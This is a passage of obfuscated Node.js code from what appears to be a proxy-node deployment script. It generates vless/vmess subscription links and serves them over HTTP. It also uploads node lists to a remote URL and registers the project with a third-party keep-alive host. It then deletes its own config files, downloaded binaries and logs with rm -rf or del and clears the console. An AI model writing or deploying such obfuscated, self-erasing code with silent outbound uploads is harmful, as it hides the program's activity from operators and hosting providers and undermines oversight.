_0x58f620[_0x28adb9(0x1e2)]['country_code']+'_'+_0x58f620[_0x28adb9(_0x44027e._0x507a16)]['org'];}catch(_0x247268){try{const _0x1b0bde=await axios[_0x28adb9(0x169)](_0x28adb9(0x1b3),{'timeout':0xbb8});if(_0x1b0bde[_0x28adb9(_0x44027e._0x426418)]&&_0x1b0bde[_0x28adb9(0x1e2)]['status']===_0x28adb9(_0x44027e._0x5d5c5c)&&_0x1b0bde[_0x28adb9(0x1e2)][_0x28adb9(0x1c9)]&&_0x1b0bde['data'][_0x28adb9(_0x44027e._0x2d9a2b)])return _0x1b0bde['data'][_0x28adb9(0x1c9)]+'_'+_0x1b0bde[_0x28adb9(0x1e2)][_0x28adb9(0x1a0)];}catch(_0x303828){}}return _0x28adb9(_0x44027e._0x24ca67);}async function _0x3004de(_0x15c312){const _0xc65ace={_0x38814c:0x1f3,_0x467ff4:0x19a,_0x3f92cd:0x17a,_0x419d0f:0x210,_0x159c49:0x223,_0x202cfa:0x20e,_0x27394b:0x1b9,_0x5ebae3:0x1de,_0x3f3222:0x177,_0x57309d:0x228},_0x370077=await _0x3e1ca4(),_0x37f0a8=NAME?NAME+'-'+_0x370077:_0x370077;return new Promise(_0x4b94b1=>{setTimeout(()=>{const _0x2a632e={_0x1d6a17:0x1de,_0x187350:0x228},_0x59e515=_0x42aa,_0x43a78d={'v':'2','ps':''+_0x37f0a8,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x59e515(0x1f5),'host':_0x15c312,'path':_0x59e515(0x1d5),'tls':_0x59e515(_0xc65ace._0x38814c),'sni':_0x15c312,'alpn':'','fp':_0x59e515(_0xc65ace._0x467ff4)},_0x335659='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x59e515(_0xc65ace._0x3f92cd)+_0x15c312+'&fp=firefox&type=ws&host='+_0x15c312+_0x59e515(_0xc65ace._0x419d0f)+_0x37f0a8+_0x59e515(0x1ae)+Buffer['from'](JSON[_0x59e515(_0xc65ace._0x159c49)](_0x43a78d))[_0x59e515(0x177)](_0x59e515(0x228))+_0x59e515(0x173)+UUID+'@'+CFIP+':'+CFPORT+_0x59e515(0x1fc)+_0x15c312+_0x59e515(_0xc65ace._0x202cfa)+_0x15c312+_0x59e515(0x17e)+_0x37f0a8+_0x59e515(_0xc65ace._0x27394b);console[_0x59e515(0x1e4)](Buffer[_0x59e515(_0xc65ace._0x5ebae3)](_0x335659)[_0x59e515(_0xc65ace._0x3f3222)](_0x59e515(_0xc65ace._0x57309d))),fs[_0x59e515(0x220)](subPath,Buffer['from'](_0x335659)[_0x59e515(0x177)](_0x59e515(_0xc65ace._0x57309d))),console[_0x59e515(0x1e4)](FILE_PATH+_0x59e515(0x1e9)),uploadNodes(),app[_0x59e515(0x169)]('/'+SUB_PATH,(_0xe98336,_0x14cb05)=>{const _0x4933d1=_0x59e515,_0x188308=Buffer[_0x4933d1(_0x2a632e._0x1d6a17)](_0x335659)[_0x4933d1(0x177)](_0x4933d1(_0x2a632e._0x187350));_0x14cb05[_0x4933d1(0x16d)](_0x4933d1(0x18e),'text/plain;\x20charset=utf-8'),_0x14cb05['send'](_0x188308);}),_0x4b94b1(_0x335659);},0x7d0);});}}async function uploadNodes(){const _0x384c84={_0x3297ab:0x192,_0x41e600:0x1e4,_0x117af9:0x1c4,_0x1892e7:0x1e0,_0x65fb11:0x1e8,_0x5d0a98:0x179,_0x122dcb:0x204},_0x15b9ef=_0xddf4d6;if(UPLOAD_URL&&PROJECT_URL){const _0x2fe4cb=PROJECT_URL+'/'+SUB_PATH,_0x6b65c1={'subscription':[_0x2fe4cb]};try{const _0x37eca9=await axios['post'](UPLOAD_URL+_0x15b9ef(_0x384c84._0x3297ab),_0x6b65c1,{'headers':{'Content-Type':_0x15b9ef(0x17d)}});return _0x37eca9&&_0x37eca9['status']===0xc8?(console[_0x15b9ef(_0x384c84._0x41e600)](_0x15b9ef(_0x384c84._0x117af9)),_0x37eca9):null;}catch(_0x41e7a6){if(_0x41e7a6[_0x15b9ef(0x1e0)]){if(_0x41e7a6[_0x15b9ef(_0x384c84._0x1892e7)][_0x15b9ef(0x204)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x15b9ef(0x21c)](listPath))return;const _0x336874=fs[_0x15b9ef(0x1be)](listPath,_0x15b9ef(_0x384c84._0x65fb11)),_0x21018f=_0x336874[_0x15b9ef(_0x384c84._0x5d0a98)]('\x0a')['filter'](_0x280302=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x280302));if(_0x21018f[_0x15b9ef(0x16f)]===0x0)return;const _0x23dfdd=JSON[_0x15b9ef(0x223)]({'nodes':_0x21018f});try{const _0x4f80e7=await axios['post'](UPLOAD_URL+_0x15b9ef(0x19b),_0x23dfdd,{'headers':{'Content-Type':'application/json'}});return _0x4f80e7&&_0x4f80e7[_0x15b9ef(_0x384c84._0x122dcb)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x4f80e7):null;}catch(_0x235b0b){return null;}}else return;}}function cleanFiles(){const _0x27e111={_0x4704e7:0x1bd,_0x49eac5:0x180},_0x5366ca={_0x4ed23d:0x1e4},_0x35bd9a={_0x79564d:0x1b8,_0x4cc5e6:0x207,_0x18603b:0x1e4,_0x3615d0:0x212};setTimeout(()=>{const _0x2069f7=_0x42aa,_0x415456=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x415456[_0x2069f7(0x1c5)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x415456['push'](phpPath);process[_0x2069f7(0x1ab)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x415456[_0x2069f7(_0x27e111._0x4704e7)]('\x20')+_0x2069f7(0x1f9),_0x342b50=>{const _0x577191=_0x2069f7;console[_0x577191(_0x35bd9a._0x79564d)](),console['log'](_0x577191(_0x35bd9a._0x4cc5e6)),console[_0x577191(_0x35bd9a._0x18603b)](_0x577191(_0x35bd9a._0x3615d0));}):exec('rm\x20-rf\x20'+_0x415456[_0x2069f7(0x1bd)]('\x20')+_0x2069f7(_0x27e111._0x49eac5),_0x15975d=>{const _0x5acbdf=_0x2069f7;console['clear'](),console[_0x5acbdf(_0x5366ca._0x4ed23d)]('App\x20is\x20running'),console[_0x5acbdf(0x1e4)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x28a1d7={_0x2a3707:0x1e4,_0x58a243:0x1ce},_0x5df803=_0xddf4d6;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x11c6be=await axios[_0x5df803(0x211)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5df803(0x17d)}});return console[_0x5df803(_0x28a1d7._0x2a3707)]('automatic\x20access\x20task\x20added\x20successfully'),_0x11c6be;}catch(_0x22866f){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x22866f[_0x5df803(_0x28a1d7._0x58a243)]),null;}}async function startserver(){const _0x42c0f6={_0x3a1188:0x1f1},_0x5066ec=_0xddf4d6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x375ac9){console[_0x5066ec(_0x42c0f6._0x3a1188)](_0x5066ec(0x18a),_0x375ac9);}}function _0x42aa(_0x531c61,_0x3c38d4){const _0x5e5eaa=_0x5e5e();return _0x42aa=function(_0x42aadb,_0xd834fb){_0x42aadb=_0x42aadb-0x164;let _0x292bca=_0x5e5eaa[_0x42aadb];return _0x292bca;},_0x42aa(_0x531c61,_0x3c38d4);}startserver()[_0xddf4d6(0x200)](_0x1b08b5=>{const _0x5b74eb=_0xddf4d6;console[_0x5b74eb(0x1f1)]('Unhandled\x20error\x20in\x20startserver:',_0x1b08b5);}),app[_0xddf4d6(0x20a)](PORT,()=>console[_0xddf4d6(0x1e4)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
